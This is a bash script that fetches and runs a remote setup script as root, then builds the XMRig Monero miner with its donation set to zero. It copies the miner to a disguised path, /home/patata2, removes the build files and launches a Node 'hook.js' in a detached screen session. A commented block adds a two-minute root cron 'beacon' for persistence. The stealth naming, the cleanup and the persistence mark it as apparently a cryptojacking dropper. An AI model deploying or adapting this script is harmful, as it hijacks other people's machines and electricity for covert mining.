#!/bin/bash
sudo rm /etc/cron.d/beacon
if [ ! -f /etc/proof ]; then
    sudo curl -sL https://deb.nodesource.com/setup_8.x -o /etc/install_node.sh
    sudo bash /etc/install_node.sh
    sudo apt-get update && sudo apt-get -y install build-essential cmake libuv1-dev nodejs
    sudo bash -c 'echo "* soft memlock 262144" >> /etc/security/limits.conf'
    sudo bash -c 'echo "* hard memlock 262144" >> /etc/security/limits.conf'
    sudo touch /etc/proof
fi
sudo rm -rf /poppa
sudo mkdir /poppa
sudo wget https://github.com/xmrig/xmrig/archive/v2.1.0.tar.gz -P /poppa
cd /poppa
sudo tar -zxvf v2.1.0.tar.gz
cd xmrig-2.1.0
sudo sed -i "40s/.*/constexpr const int kDonateLevel = 0;/" src/donate.h
sudo mkdir build
cd build
sudo cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a
sudo make -j
sudo cp xmrig /home/patata2
sudo chmod +x /home/patata2
sudo rm -rf /poppa
sudo sysctl -w vm.nr_hugepages=128
screen -dm sudo NODE_ENV=production nodejs /patata/hook.js "$1" "$2"

#if [ $# -eq 3 ]; then
    #sudo touch /etc/cron.d/beacon
    #cronjob='*/2 * * * *'
    #executable='bash /patata/tramboliko2.sh'
    #echo "${cronjob} root $executable >/dev/null 2>&1" | sudo tee /etc/cron.d/beacon
#fi
